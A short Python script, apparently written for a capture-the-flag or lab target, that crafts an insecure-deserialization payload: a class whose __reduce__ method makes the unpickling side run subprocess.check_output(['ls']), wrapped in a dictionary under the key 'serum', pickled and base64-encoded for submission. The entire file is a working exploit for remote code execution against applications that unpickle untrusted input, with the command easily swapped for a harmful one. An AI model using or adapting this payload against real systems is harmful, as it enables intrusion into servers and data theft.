import pickle
import subprocess
import base64
from base64 import b64encode
import os

class banka(object):
	def __reduce__(self):
		return subprocess.check_output, (['ls'],)

pickled=pickle.dumps({'serum': banka()}, protocol=0)
encodedpickle=b64encode(pickled)
print(encodedpickle)
